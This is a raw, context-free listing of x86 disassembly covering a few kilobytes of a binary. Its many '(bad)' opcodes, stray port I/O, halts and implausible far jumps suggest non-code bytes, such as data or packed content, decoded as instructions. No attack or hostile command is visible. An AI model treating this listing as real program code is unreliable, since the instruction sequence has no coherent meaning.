  445e3b:	out    0xf4,al
  445e3d:	jmp    FWORD PTR [edi-0x1a]
  445e40:	hlt    
  445e41:	jmp    FWORD PTR [edi]
  445e43:	out    0xf4,al
  445e45:	jmp    DWORD PTR [edx-0x46]
  445e48:	sub    eax,0x2d0b25fc
  445e4d:	cld    
  445e4e:	sbb    eax,0xfc2d1d
  445e53:	adc    eax,0xdfc2cfb
  445e58:	sti    
  445e59:	sub    al,0xfc
  445e5b:	add    eax,0xfdfc3c95
  445e60:	dec    esi
  445e61:	cmp    al,0xfc
  445e63:	cmc    
  445e64:	inc    eax
  445e65:	aas    
  445e66:	cld    
  445e67:	in     eax,dx
  445e68:	xor    bh,BYTE PTR [edi]
  445e6a:	cld    
  445e6b:	in     eax,0x80
  445e6d:	aas    
  445e6e:	cld    
  445e6f:	fnsave [eax+0x49]
  445e72:	cld    
  445e73:	aad    0xa0
  445e75:	dec    ecx
  445e76:	cld    
  445e77:	int    0xb4
  445e79:	dec    ecx
  445e7a:	cld    
  445e7b:	lds    edi,FWORD PTR [esi+edi*1+0x3e88bdfc]
  445e82:	cld    
  445e83:	mov    ch,0xa0
  445e85:	ds cld 
  445e87:	lods   eax,DWORD PTR ds:[esi]
  445e88:	push   eax
  445e89:	xor    bh,ah
  445e8b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  445e8c:	push   esp
  445e8d:	xor    bh,ah
  445e8f:	popf   
  445e90:	push   cs
  445e91:	xor    bh,ah
  445e93:	xchg   ebp,eax
  445e94:	sub    dh,BYTE PTR [edx]
  445e96:	cld    
  445e97:	lea    ecx,[edx+0x3e]
  445e9a:	cld    
  445e9b:	test   DWORD PTR [esi+0x3e],esi
  445e9e:	cld    
  445e9f:	jge    0x445eb1
  445ea1:	ds cld 
  445ea3:	jne    0x445ed1
  445ea5:	ds cld 
  445ea7:	ins    DWORD PTR es:[edi],dx
  445ea8:	cmp    al,0x3e
  445eaa:	cld    
  445eab:	les    ecx,FWORD PTR gs:[eax-0x4]
  445eaf:	pop    ebp
  445eb0:	enter  0xfc48,0x55
  445eb4:	clc    
  445eb5:	dec    eax
  445eb6:	cld    
  445eb7:	add    BYTE PTR [ebp-0x6],cl
  445eba:	dec    eax
  445ebb:	cld    
  445ebc:	inc    ebp
  445ebd:	data16 ds cld 
  445ec0:	cmp    eax,0x364803d9
  445ec5:	lods   al,BYTE PTR ds:[esi]
  445ec6:	clc    
  445ec7:	inc    edi
  445ec8:	lods   al,BYTE PTR cs:[esi]
  445eca:	jmp    0x1e4a:0x34ac2647
  445ed1:	lods   al,BYTE PTR ds:[esi]
  445ed2:	and    BYTE PTR [edx+0x16],cl
  445ed5:	lods   al,BYTE PTR ds:[esi]
  445ed6:	push   ds
  445ed7:	dec    edx
  445ed8:	push   cs
  445ed9:	lods   al,BYTE PTR ds:[esi]
  445eda:	je     0x445f26
  445edc:	push   es
  445edd:	lods   al,BYTE PTR ds:[esi]
  445ede:	push   eax
  445edf:	dec    edx
  445ee0:	(bad)  
  445ee1:	stos   DWORD PTR es:[edi],eax
  445ee2:	jo     0x445f2e
  445ee4:	imul   BYTE PTR [ebx-0x5411b572]
  445eea:	nop
  445eeb:	xor    esp,esi
  445eed:	stos   DWORD PTR es:[edi],eax
  445eee:	je     0x445f23
  445ef0:	fisubr WORD PTR [ebx-0x5429cc64]
  445ef6:	cwde   
  445ef7:	xor    ecx,esi
  445ef9:	stos   DWORD PTR es:[edi],eax
  445efa:	stos   BYTE PTR es:[edi],al
  445efb:	xor    eax,esi
  445efd:	stos   DWORD PTR es:[edi],eax
  445efe:	lods   al,BYTE PTR ds:[esi]
  445eff:	xor    edi,DWORD PTR [esi-0x49b98155]
  445f05:	stos   DWORD PTR es:[edi],eax
  445f06:	inc    esp
  445f07:	dec    ecx
  445f08:	scas   al,BYTE PTR es:[edi]
  445f09:	stos   DWORD PTR es:[edi],eax
  445f0a:	xor    cl,BYTE PTR [ecx-0x5a]
  445f0d:	stos   DWORD PTR es:[edi],eax
  445f0e:	and    BYTE PTR [ecx-0x62],cl
  445f11:	stos   DWORD PTR es:[edi],eax
  445f12:	add    BYTE PTR [ecx-0x6a],cl
  445f15:	stos   DWORD PTR es:[edi],eax
  445f16:	aam    0x48
  445f18:	mov    gs,WORD PTR [ebx-0x79ffb71e]
  445f1e:	stos   DWORD PTR es:[edi],eax
  445f1f:	mov    al,0x4a
  445f21:	jle    0x445ece
  445f23:	in     al,0x33
  445f25:	jbe    0x445ed2
  445f27:	pop    esi
  445f28:	inc    edi
  445f29:	outs   dx,BYTE PTR ds:[esi]
  445f2a:	stos   DWORD PTR es:[edi],eax
  445f2b:	sbb    dh,BYTE PTR [ebx]
  445f2d:	stos   WORD PTR es:[edi],ax
  445f2f:	call   0x401dc137
  445f34:	cmp    BYTE PTR [esi-0x55],dl
  445f37:	cmp    BYTE PTR ds:[esi-0x55],cl
  445f3b:	add    DWORD PTR [ecx-0x76],ebx
  445f3e:	lods   eax,DWORD PTR ds:[esi]
  445f3f:	imul   cl
  445f41:	popa   
  445f42:	fld    DWORD PTR [eax]
  445f44:	iret   
  445f45:	jp     0x445ef4
  445f47:	imul   BYTE PTR [edi+0x11f6ad6a]
  445f4d:	imul   ebp,DWORD PTR [ebp-0x52a4fe0a],0xfffffff6
  445f54:	fstp   QWORD PTR [edx-0x53]
  445f57:	test   BYTE PTR [ebx+0x48],0xad
  445f5b:	test   BYTE PTR [edi+0x48],0xad
  445f5f:	neg    BYTE PTR [ecx]
  445f61:	cmp    BYTE PTR [ebp-0x52c79a0a],ch
  445f67:	not    BYTE PTR [ecx+0x28]
  445f6a:	lods   eax,DWORD PTR ds:[esi]
  445f6b:	idiv   BYTE PTR [edi+0x28]
  445f6e:	lods   eax,DWORD PTR ds:[esi]
  445f6f:	imul   cl
  445f71:	popa   
  445f72:	fld    DWORD PTR [eax]
  445f74:	xchg   esi,eax
  445f75:	popa   
  445f76:	fld    DWORD PTR [eax-0x7f269e29]
  445f7c:	jge    0x445fdf
  445f7e:	fld    DWORD PTR [eax-0x269eff15]
  445f84:	cmp    dh,0x61
  445f87:	fld    DWORD PTR [eax-0x9529629]
  445f8d:	pop    ecx
  445f8e:	pop    esi
  445f8f:	fld    DWORD PTR [eax-0x7f269e24]
  445f95:	(bad)  [ecx-0x27]
  445f98:	sbb    BYTE PTR [edi+0x48],0xad
  445f9c:	neg    BYTE PTR [ebx+0x48]
  445f9f:	lods   eax,DWORD PTR ds:[esi]
  445fa0:	imul   BYTE PTR ds:0xf8f6ad39
  445fa6:	popa   
  445fa7:	fld    DWORD PTR [eax-0x952d6fb]
  445fad:	cmp    ebp,DWORD PTR [ecx]
  445faf:	lods   eax,DWORD PTR ds:[esi]
  445fb0:	mul    bh
  445fb2:	popa   
  445fb3:	fld    DWORD PTR [eax+0xd63600]
  445fb9:	xor    BYTE PTR [edi],0xd6
  445fbc:	add    BYTE PTR [eax-0xb1185],al
  445fc2:	inc    esp
  445fc3:	(bad)  
  445fc4:	add    BYTE PTR [eax-0xb11af],al
  445fca:	cmp    dl,dh
  445fcc:	add    BYTE PTR [eax-0xb1161],al
  445fd2:	test   eax,0x3bfff4ee
  445fd7:	(bad)  
  445fd8:	add    BYTE PTR [eax-0xb11ad],al
  445fde:	clc    
  445fdf:	aad    0x0
  445fe1:	sbb    BYTE PTR [eax],0xd6
  445fe4:	add    BYTE PTR [eax+0xd5d800],al
  445fea:	add    BYTE PTR [edi],0xd6
  445fed:	add    BYTE PTR [eax-0x7fff2a0a],al
  445ff3:	xlat   BYTE PTR ds:[ebx]
  445ff4:	out    dx,al
  445ff5:	hlt    
  445ff6:	inc    ebp
  445ff8:	out    dx,al
  445ff9:	hlt    
  445ffa:	(bad)  
  445ffb:	mov    ebx,0xff0000d5
  446000:	loop   0x445ff6
  446002:	dec    edi
  446004:	loope  0x445ffa
  446006:	inc    ebp
  446008:	stc    
  446009:	hlt    
  44600a:	jmp    FWORD PTR [ebx-0x4e000b07]
  446010:	stc    
  446011:	hlt    
  446012:	jmp    DWORD PTR [edi-0x17]
  446015:	hlt    
  446016:	jmp    FWORD PTR [ebp-0x17]
  446019:	hlt    
  44601a:	jmp    DWORD PTR [ebx-0x17]
  44601d:	hlt    
  44601e:	push   DWORD PTR [edi]
  446020:	jmp    0xe9a26019
  446025:	hlt    
  446026:	call   FWORD PTR [edi]
  446028:	jmp    0xe9966021
  44602d:	hlt    
  44602e:	jmp    DWORD PTR [edx-0x30]
  446031:	xor    ah,bh
  446033:	pop    ebp
  446034:	int    0x30
  446036:	cld    
  446037:	push   ebp
  446038:	mov    bl,0x2
  44603a:	add    BYTE PTR [edx+0x48],ah
  44603d:	xor    esp,edi
  44603f:	inc    ebp
  446040:	or     DWORD PTR ds:0x3d1b3dfc,edi
  446046:	cld    
  446047:	xor    eax,0xfc3d2b
  44604c:	sub    eax,0x620002b3
  446051:	cwde   
  446052:	cmp    edi,esp
  446054:	sbb    eax,0x15fc3b65
  446059:	fwait
  44605a:	cmp    edi,esp
  44605c:	or     eax,0x5fc3b73
  446061:	loope  0x44609c
  446063:	cld    
  446064:	std    
  446065:	cwde   
  446066:	cmp    edi,esp
  446068:	cmc    
  446069:	and    bh,BYTE PTR [edx]
  44606b:	cld    
  44606c:	in     eax,dx
  44606d:	adc    al,0x3a
  44606f:	cld    
  446070:	in     eax,0x8
  446072:	cmp    bh,ah
  446074:	fnsave [edx+0x26620002]
  44607a:	add    al,BYTE PTR [esi+eax*2+0x24]
  44607e:	ss addr16 inc ebx
  446081:	push   esi
  446082:	ds fs dec esi
  446085:	mov    dl,0x2
  446087:	imul   esp,DWORD PTR [edx-0x12],0x1d257228
  44608e:	sbb    DWORD PTR [esi+esi*1],edi
  446091:	push   ds
  446092:	xor    eax,0x211e0c61
  446097:	pop    ebp
  446098:	bound  esi,QWORD PTR [ebx]
  44609a:	std    
  44609b:	inc    ebp
  44609c:	push   ss
  44609d:	rcl    DWORD PTR [edi],0x5d
  4460a0:	adc    cl,ch
  4460a2:	xor    esp,DWORD PTR [esi+0x4]
  4460a5:	out    0xe,eax
  4460a7:	gs add ebx,ecx
  4460aa:	adc    ebx,DWORD PTR ds:0x16383705
  4460b0:	add    ch,bh
  4460b2:	cmp    eax,DWORD PTR ds:0xf5d9d117
  4460b8:	pop    ss
  4460b9:	mov    dh,0x35
  4460bb:	or     al,0xe2
  4460bd:	test   eax,0x72040435
  4460c2:	fsub   QWORD PTR [esi]
  4460c4:	sub    esi,ecx
  4460c6:	or     eax,0x1cc92701
  4460cb:	iret   
  4460cc:	sbb    ah,al
  4460ce:	sub    eax,0xdcb303e8
  4460d3:	mov    al,ds:0xda3e8e21
  4460d8:	pop    ds
  4460d9:	jge    0x446117
  4460db:	shr    DWORD PTR [eax],cl
  4460dd:	scas   al,BYTE PTR es:[edi]
  4460de:	adc    al,dh
  4460e0:	es nop
  4460e2:	ds mov ebp,0xe82d8428
  4460e8:	add    edi,DWORD PTR [edi-0x24]
  4460eb:	mov    al,0x21
  4460ed:	jle    0x44612d
  4460ef:	call   0x3e28:0x833c7d1f
  4460f6:	sbb    eax,0x3e50267d
  4460fb:	lea    ebp,[eax]
  4460fd:	inc    esp
  4460fe:	sub    eax,0xdae303e8
  446103:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  446104:	sub    BYTE PTR [esi+0x16],cl
  446107:	ja     0x446130
  446109:	inc    edi
  44610a:	xor    eax,0x37433c45
  44610f:	cmp    al,0x20
  446111:	pop    es
  446112:	adc    al,ch
  446114:	add    eax,DWORD PTR [eax]
  446116:	iret   
  446117:	ficomp DWORD PTR [esi]
  446119:	daa    
  44611a:	push   es
  44611b:	or     DWORD PTR [edx],edi
  44611d:	and    DWORD PTR [ecx],eax
  44611f:	sbb    bh,BYTE PTR [eax+ebp*1]
  446122:	adc    BYTE PTR [esi],bh
  446124:	add    DWORD PTR [edx],edi
  446126:	push   edi
  446127:	fld    DWORD PTR [eax]
  446129:	push   0x5d
  44612b:	adc    eax,0x61b1a65
  446130:	ins    DWORD PTR es:[edi],dx
  446131:	aaa    
  446132:	inc    ecx
  446133:	cmp    eax,0x4660c6c
  446138:	add    ah,BYTE PTR [eax]
  44613a:	xor    BYTE PTR [eax],0x6d
  44613d:	adc    BYTE PTR [ecx+0x7d03683d],al
  446143:	sbb    dh,BYTE PTR [ebx+0x0]
  446146:	pop    edx
  446147:	xor    BYTE PTR [edx+0x8],ah
  44614a:	or     BYTE PTR [edx],0x5c
  44614d:	retf   0x3055
  446150:	iretw  
  446152:	popa   
  446153:	and    eax,0x2a7dbcfc
  446158:	push   edx
  446159:	les    ebp,FWORD PTR [ebp+0x17]
  44615c:	pusha  
  44615d:	aad    0x74
  44615f:	add    al,0x1
  446161:	jl     0x4461c2
  446163:	sbb    eax,0x45bc85c
  446168:	inc    edx
  446169:	mov    ebx,0x8a683558
  44616e:	inc    eax
  44616f:	cmp    eax,0x353e8452
  446174:	push   0xd98386
  446179:	add    DWORD PTR [eax],0x5f
  44617c:	out    0x5b,al
  44617e:	jge    0x44610d
  446180:	cmp    BYTE PTR [edx+0x75],dh
  446183:	sbb    al,0x2b
  446185:	jae    0x44610d
  446187:	push   edi
  446188:	fld    DWORD PTR [eax]
  44618a:	(bad)  
  44618b:	pop    esp
  44618c:	or     bl,BYTE PTR [ebp+ebx*2+0x22]
  446190:	cmp    BYTE PTR [edx+0x55],dh
  446193:	sbb    eax,0x7446732b
  446198:	fld    DWORD PTR [eax]
  44619a:	sub    DWORD PTR [ecx-0x1c],esp
  44619d:	data16 add BYTE PTR [edi-0x2],cl
  4461a1:	jb     0x4461e6
  4461a3:	dec    ecx
  4461a4:	ret    0x6964
  4461a7:	sub    dl,bh
  4461a9:	pop    esp
  4461aa:	push   ebx
  4461ab:	push   ds
  4461ac:	cld    
  4461ad:	imul   edx,DWORD PTR fs:[ebx+edi*8+0x0],0x44defa00
  4461b6:	ins    BYTE PTR es:[edi],dx
  4461b7:	js     0x4461d3
  4461b9:	pop    ebp
  4461ba:	ins    BYTE PTR es:[edi],dx
  4461bb:	push   esp
  4461bc:	std    
  4461bd:	add    BYTE PTR [eax],al
  4461bf:	dec    esp
  4461c0:	(bad)  [esi]
  4461c2:	imul   edx,DWORD PTR [edi-0x2],0xfe666944
  4461c9:	inc    esp
  4461ca:	outs   dx,DWORD PTR ds:[esi]
  4461cb:	jg     0x4461c5
  4461cd:	jno    0x446213
  4461cf:	sbb    cl,dh
  4461d1:	push   ebx
  4461d2:	push   esp
  4461d3:	adc    al,bh
  4461d5:	push   ebx
  4461d6:	add    BYTE PTR [esp+ebx*8-0x11d09acb],dh
  4461dd:	push   ebx
  4461de:	ins    DWORD PTR es:[edi],dx
  4461df:	add    bl,cl
  4461e1:	punpckhbw mm5,QWORD PTR [esi+ebx*1+0x18]
  4461e6:	pusha  
  4461e7:	ins    DWORD PTR es:[edi],dx
  4461e8:	cs loope 0x4461eb
  4461eb:	add    bh,ch
  4461ed:	fidiv  DWORD PTR [edi+ebp*2]
  4461f0:	enter  0x601d,0x74
  4461f4:	fsubp  st(5),st
  4461f6:	ins    DWORD PTR es:[di],dx
  4461f8:	out    dx,al
  4461f9:	in     eax,dx
  4461fa:	pop    ebp
  4461fb:	inc    esi
  4461fc:	loop   0x4461c3
  4461fe:	push   ebx
  4461ff:	push   esp
  446200:	repnz (bad) 
  446202:	push   ebx
  446203:	add    BYTE PTR [ebx+0x3f735ccf],ch
  446209:	int3   
  44620a:	popa   
  44620b:	ins    DWORD PTR es:[edi],dx
  44620c:	cmp    ebx,DWORD PTR [ebx]
  44620e:	add    DWORD PTR [eax],eax
  446210:	(bad)  
  446211:	fistp  WORD PTR [ebx+esi*2+0xf]
  446215:	retf   
  446216:	popa   
  446217:	jo     0x44627b
  446219:	or     DWORD PTR [edi],edx
  44621b:	inc    ecx
  44621c:	bound  ecx,QWORD PTR [eax-0x4]
  44621f:	cmp    eax,0x44281510
  446224:	sti    
  446225:	adc    DWORD PTR [ebx],edx
  446227:	popa   
  446228:	lock call 0xc4a6252a
  44622e:	adc    eax,0x13ec0661
  446233:	(bad)  
  446234:	lock rcl BYTE PTR [edx],1
  446237:	jns    0x4461ee
  446239:	mov    dl,0x2
  44623b:	adc    eax,0x6c13a65c
  446240:	ror    dh,1
  446242:	daa    
  446243:	data16 add BYTE PTR [ebp+0x610102b2],ch
  44624a:	repz daa 
  44624c:	ins    BYTE PTR es:[edi],dx
  44624d:	mov    ds,ebp
  44624f:	pop    ds
  446250:	jo     0x4461e4
  446252:	xchg   ecx,eax
  446253:	push   cs
  446254:	push   0x7802b28d
  446259:	arpl   WORD PTR [ebp+edx*1+0x64],si
  44625d:	jg     0x4462cd
  44625f:	adc    eax,0x17468765
  446264:	inc    esp
  446265:	jne    0x4461f6
  446267:	sbb    eax,0x1699a464
  44626c:	pop    ebp
  44626d:	mov    ds,WORD PTR [ecx-0x509da2df]
  446273:	or     DWORD PTR [ebx+0x7f],edx
  446276:	dec    esi
  446277:	cmp    al,0x69
  446279:	dec    esi
  44627a:	push   ebp
  44627b:	cmp    eax,0x15404e6c
  446280:	bound  edx,QWORD PTR [edi+0x26]
  446283:	sub    DWORD PTR [ebx+0x2d],esi
  446286:	mov    dl,0x2
  446288:	pcmpgtb mm3,QWORD PTR [esi+0x13]
  44628c:	ins    BYTE PTR es:[edi],dx
  44628d:	xor    BYTE PTR [edi+0x12],cl
  446290:	jns    0x4462a7
  446292:	(bad)  
  446294:	add    edx,DWORD PTR [ebx+ebx*8+0x43]
  446298:	adc    ecx,DWORD PTR [esi]
  44629a:	daa    
  44629b:	dec    ebx
  44629c:	adc    al,0x1b
  44629e:	sbb    ch,al
  4462a0:	add    ecx,ecx
  4462a2:	ficom  WORD PTR [esi]
  4462a4:	and    eax,0x1f1e2cfb
  4462a9:	add    al,dh
  4462ab:	pop    es
  4462ac:	inc    ecx
  4462ad:	push   ds
  4462ae:	adc    eax,0x3f3d35
  4462b3:	das    
  4462b4:	add    eax,0xf5d8f623
  4462b9:	add    al,0x9e
  4462bb:	ds cld 
  4462bd:	sub    dh,al
  4462bf:	sub    edx,DWORD PTR ds:[edx]
  4462c2:	mov    ebx,0xc323112d
  4462c7:	xor    eax,0x2dc1291b
  4462cc:	add    DWORD PTR [edi],ebx
  4462ce:	mov    esp,0xa10355d9
  4462d3:	xor    eax,0x118712cf
  4462d8:	leave  
  4462d9:	sbb    eax,0x3c535be
  4462de:	das    
  4462df:	fisubr WORD PTR [esi-0x54c151e4]
  4462e5:	sbb    eax,DWORD PTR [ebx-0x58e173d9]
  4462eb:	cs mov esp,0xb1178b17
  4462f1:	pop    ss
  4462f2:	(bad)  
  4462f3:	fstp   DWORD PTR [eax-0x67ded8fc]
  4462f9:	and    al,0x44
  4462fb:	cmp    eax,0x32441da5
  446300:	call   0x361d:0x8536441e
  446307:	or     BYTE PTR [ecx+edx*1+0x4b],ch
  44630b:	xor    eax,DWORD PTR [ecx]
  44630d:	mov    es,WORD PTR [eax]
  44630f:	push   eax
  446310:	adc    al,0x1
  446312:	add    al,0x61
  446314:	sbb    BYTE PTR [ebx+0x4c],dh
  446317:	xor    DWORD PTR ds:0x35752c5c,0xd94f515c
  446321:	add    BYTE PTR [edx+0x39601e63],dh
  446327:	dec    esp
  446328:	xor    bl,BYTE PTR [esi+esi*1+0x3f]
  44632c:	add    edi,DWORD PTR [edi]
  44632e:	inc    eax
  44632f:	inc    edx
  446330:	push   es
  446331:	add    DWORD PTR [edx+0x65],ebx
  446334:	push   ss
  446335:	addr16 adc al,0x41
  446338:	sub    DWORD PTR [edi+0x10],ecx
  44633b:	test   DWORD PTR [edx],esi
  44633d:	inc    esi
  44633e:	setl   BYTE PTR [eax]
  446341:	gs add al,0x66
  446344:	lods   eax,DWORD PTR ds:[esi]
  446345:	std    
  446346:	sbb    DWORD PTR [ebp+0x35],edi
  446349:	cmp    al,0xf7
  44634b:	test   BYTE PTR [ebx],bh
  44634d:	ins    DWORD PTR es:[edi],dx
  44634e:	jmp    0x264725b4
  446353:	test   DWORD PTR ds:0x2753dc42,esi
  446359:	pop    esp
  44635a:	iret   
  44635b:	jne    0x446372
  44635d:	imul   ebx,ebx,0xe95d383c
  446363:	popa   
  446364:	pop    ss
  446365:	cld    
  446366:	cdq    
  446367:	cmp    al,0x35
  446369:	dec    ebp
  44636a:	rcl    DWORD PTR [ebx+0x4],1
  44636d:	pusha  
  44636e:	int    0x31
  446370:	daa    
  446371:	push   0x305300be
  446376:	ins    DWORD PTR es:[edi],dx
  446377:	mov    al,ds:0xaa018661
  44637c:	jae    0x446382
  44637e:	pusha  
  44637f:	popf   
  446380:	jl     0x446365
  446382:	addr16 jge 0x446309
  446385:	sbb    al,0x60
  446387:	add    BYTE PTR [ebx-0x3a],cl
  44638a:	outs   dx,BYTE PTR ds:[si]
  44638c:	in     al,0xed
  44638e:	add    BYTE PTR [eax],al
  446390:	sbb    ebp,0xf7e67241
  446396:	fs gs jbe 0x446365
  44639a:	push   ebx
  44639b:	outs   dx,BYTE PTR ds:[esi]
  44639c:	aaa    
  44639d:	in     al,dx
  44639e:	add    BYTE PTR [eax],al
  4463a0:	arpl   di,dx
  4463a2:	xor    eax,0x64183765
  4463a7:	jb     0x4463f2
  4463a9:	cli    
  4463aa:	pop    esi
  4463ab:	je     0x446404
  4463ad:	lds    esi,FWORD PTR [edx+0x65]
  4463b0:	sub    dh,cl
  4463b2:	inc    edi
  4463b3:	fs jnp 0x44638c
  4463b6:	add    BYTE PTR ds:0x4671f927,0x79
  4463bd:	cli    
  4463be:	push   ebx
  4463bf:	add    BYTE PTR [edi+edx*8-0x5b296ca],bh
  4463c6:	imul   ecx,DWORD PTR ss:[ecx-0x37],0xf9524664
  4463ce:	push   ebx
  4463cf:	push   edi
  4463d0:	dec    ebx
  4463d1:	(bad)  
  4463d2:	mov    dh,0x0
  4463d4:	js     0x44639d
  4463d6:	push   ebx
  4463d7:	popa   
  4463d8:	add    BYTE PTR [edi],al
  4463da:	sti    
  4463db:	xor    al,0x69
  4463dd:	cmp    ebx,edi
  4463df:	popa   
  4463e0:	je     0x4463fe
  4463e2:	enter  0x5777,0xfb
  4463e6:	aad    0x9e
  4463e8:	add    eax,0x7472bee5
  4463ed:	mov    dh,0xf6
  4463ef:	pop    esp
  4463f0:	inc    esi
  4463f1:	mov    ecx,0x2a0053fa
  4463f6:	fild   DWORD PTR [ebp+0x72]
  4463f9:	ror    cl,cl
  4463fb:	push   ebx
  4463fc:	inc    esi
  4463fd:	repnz rcl DWORD PTR [ebx+0x0],0x62
  446402:	jp     0x446404
  446404:	aas    
  446405:	inc    edi
  446406:	dec    esp
  446407:	cmp    al,0x69
  446409:	ss push ebp
  44640b:	inc    ebx
  44640c:	ins    BYTE PTR es:[edi],dx
  44640d:	ss push ds
  44640f:	sbb    esp,DWORD PTR [edx+0x2f]
  446412:	and    al,0x1f
  446414:	jae    0x44642b
  446416:	mov    al,0x2
  446418:	pop    eax
  446419:	pop    esi
  44641a:	ficomp WORD PTR [edi]
  44641c:	popa   
  44641d:	push   es
  44641e:	cli    
  44641f:	adc    esp,DWORD PTR [edi+edi*8-0x51]
  446423:	add    cl,dh
  446425:	(bad)  
  446426:	out    dx,eax
  446427:	push   cs
  446428:	pop    ebp
  446429:	add    esp,esp
  44642b:	pop    ds
  44642c:	or     edx,DWORD PTR ds:[eax+eiz*1]
  446430:	dec    edi
  446431:	(bad)  
  446432:	(bad)  
  446435:	pop    es
  446436:	in     al,dx
  446437:	inc    edx
  446438:	imul   esi,esi,0x692dd4
  44643e:	fcom   st(5)
  446440:	aas    
  446441:	js     0x4464a5
  446443:	sbb    eax,DWORD PTR [eax]
  446445:	dec    esi
  446446:	mov    ebx,0xc36d10c4
  44644b:	(bad)  
  44644c:	cmp    esp,DWORD PTR [esi+ecx*8-0x31]
  446450:	sbb    eax,0xfc2e6200
  446455:	cmp    eax,0x4316a0bb
  44645a:	mov    dh,0x87
  44645c:	minps  xmm4,XMMWORD PTR [edx+0x51]
  446460:	add    DWORD PTR [edx+0x7f],edx
  446463:	xchg   ebp,eax
  446464:	sbb    ebp,DWORD PTR [esi-0x79]
  446467:	jbe    0x44647e
  446469:	jb     0x4464ea
  44646b:	xchg   ebx,eax
  44646c:	push   es
  44646d:	addr16 jo 0x446409
  446470:	xor    eax,DWORD PTR [eax]
  446472:	bound  ecx,QWORD PTR [ebx]
  446474:	cld    
  446475:	cmp    eax,0x4616607b
  44647a:	jg     0x446455
  44647c:	lahf   
  44647d:	setl   BYTE PTR [edx]
  446480:	test   BYTE PTR [eax],ah
  446482:	and    eax,0x1e0097d9
  446487:	ss call 0x1f0f:0x892f3b18
  44648f:	add    eax,0x3a171590
  446494:	test   BYTE PTR [ebx],al
  446496:	jmp    0x44646e
  446498:	mov    fs,WORD PTR [ebx+edi*1]
  44649b:	and    eax,0xe101b26
  4464a0:	dec    ebp
  4464a1:	sbb    BYTE PTR [eax],al
  4464a3:	push   es
  4464a4:	xor    bl,BYTE PTR [eax+0x18]
  4464a7:	das    
  4464a8:	adc    BYTE PTR [edx+0x1e],cl
  4464ab:	daa    
  4464ac:	cmp    al,0x34
  4464ae:	pop    ss
  4464af:	(bad)  
  4464b0:	fld    DWORD PTR [eax]
  4464b2:	add    eax,0x18382636
  4464b7:	sti    
  4464b8:	cmp    ecx,DWORD PTR [ecx+0x10]
  4464bb:	pop    es
  4464bc:	adc    DWORD PTR [ecx],ecx
  4464be:	sbb    bh,BYTE PTR [esi+0x703fd2d]
  4464c4:	aad    0x39
  4464c6:	and    ecx,edx
  4464c8:	es cmc 
  4464ca:	and    BYTE PTR [esi-0x3cdf05cf],dl
  4464d0:	xor    eax,0xda6303e8
  4464d5:	sub    dl,BYTE PTR [esi]
  4464d7:	(bad)  
  4464d8:	cmp    ch,ah
  4464da:	and    BYTE PTR [esi-0x7cdf25cf],dl
  4464e0:	xor    eax,0xd76e03e8
  4464e5:	mov    ebx,0xb42b7e16
  4464ea:	and    BYTE PTR [edx+ebx*1-0x18],bh
  4464ee:	add    eax,edi
  4464f0:	fstp   DWORD PTR [ebp+0x12c8717]
  4464f6:	shl    DWORD PTR [ebx-0x603b9ace],0x2e
  4464fd:	pop    edi
  4464fe:	pop    DWORD PTR [edx+0x61e9722b]
  446504:	cdq    
  446505:	add    ah,BYTE PTR [ebp+0x5d3a6800]
  44650b:	popf   
  44650c:	cmp    si,WORD PTR [ebx-0x78]
  446510:	push   edi
  446511:	and    al,BYTE PTR [eax-0x17]
  446514:	popa   
  446515:	xchg   esi,eax
  446516:	add    ah,BYTE PTR [ebp+0x7d603c48]
  44651c:	and    ebp,DWORD PTR [ebx]
  44651e:	pop    esp
  44651f:	dec    esp
  446520:	mov    sp,0x2600
  446524:	jne    0x446553
  446526:	inc    edx
  446527:	inc    esi
  446528:	jne    0x446560
  44652a:	pusha  
  44652b:	aas    
  44652c:	inc    edx
  44652d:	adc    eax,0x105d5768
  446532:	add    DWORD PTR [edi+0x5c],ebp
  446535:	loopne 0x446592
  446537:	cmp    eax,0x406d3a28
  44653c:	push   eax
  44653d:	(bad)  
  44653e:	push   ecx
  44653f:	and    BYTE PTR [edi+0x2d],dh
  446542:	pop    esp
  446543:	or     al,0x99
  446545:	aaa    
  446546:	pop    edi
  446547:	push   es
  446548:	data16 cli 
  44654a:	add    DWORD PTR [esi],esp
  44654c:	gs sub eax,0x2a540c4f
  446552:	push   0x78dc580e
  446557:	push   ds
  446558:	popfw  
  44655a:	add    bl,BYTE PTR [esi]
  44655c:	dec    esi
  44655d:	cld    
  44655e:	data16 mov ah,0x6c
  446561:	sub    eax,0xd952e15c
  446566:	add    BYTE PTR [esi+0x62],bh
  446569:	or     ebx,DWORD PTR [ebp+edi*4+0x0]
  44656d:	cmp    BYTE PTR fs:[edx+0x0],dh
  446571:	cs call 0xd362d9da
  446577:	add    BYTE PTR [eax],al
  446579:	repnz aam 0x35
  44657c:	gs scas eax,DWORD PTR es:[edi]
  44657e:	fidiv  WORD PTR [edx+0x69]
  446581:	std    
  446582:	mov    edi,0xbffb7944
  446587:	inc    ebp
  446588:	add    dl,ch
  44658a:	aam    0x35
  44658c:	gs out dx,eax
  44658e:	out    0x5d,al
  446590:	addr16 shl ch,cl
  446593:	pop    edi
  446594:	ins    BYTE PTR es:[edi],dx
  446595:	inc    esp
  446597:	addr16 jbe 0x446578
  44659a:	lds    eax,FWORD PTR [eax]
  44659c:	add    dh,al
  44659e:	aad    0x48
  4465a0:	gs sub al,ch
  4465a3:	aas    
  4465a4:	ins    BYTE PTR es:[edi],dx
  4465a5:	daa    
  4465a6:	shl    BYTE PTR [ecx+0x0],0x4a
  4465aa:	aam    0x48
  4465ac:	gs sbb al,ch
  4465af:	ss jb  0x4465e0
  4465b2:	mov    esi,0xd45b0000
  4465b7:	dec    eax
  4465b8:	gs sbb al,ch
  4465bb:	xor    al,0x65
  4465bd:	sub    cl,cl
  4465bf:	jb     0x446630
  4465c1:	adc    ch,0x3d
  4465c4:	add    edx,DWORD PTR [ebx+0x78705fbe]
  4465ca:	(bad)  
  4465cb:	push   ebx
  4465cc:	popa   
  4465cd:	outs   dx,DWORD PTR ds:[esi]
  4465ce:	mov    esi,0xee000000
  4465d3:	aam    0x3b
  4465d5:	outs   dx,DWORD PTR ds:[esi]
  4465d6:	sub    eax,0x676936bf
  4465db:	mov    esi,0xd54c7833
  4465e0:	dec    ebp
  4465e1:	add    eax,0x6553c5d8
  4465e6:	cmp    ebx,edx
  4465e8:	repnz add ah,BYTE PTR [edx+0x6f]
  4465ec:	pop    ss
  4465ed:	ins    BYTE PTR es:[edi],dx
  4465ee:	mov    cl,0x89
  4465f0:	or     eax,0x2685876c
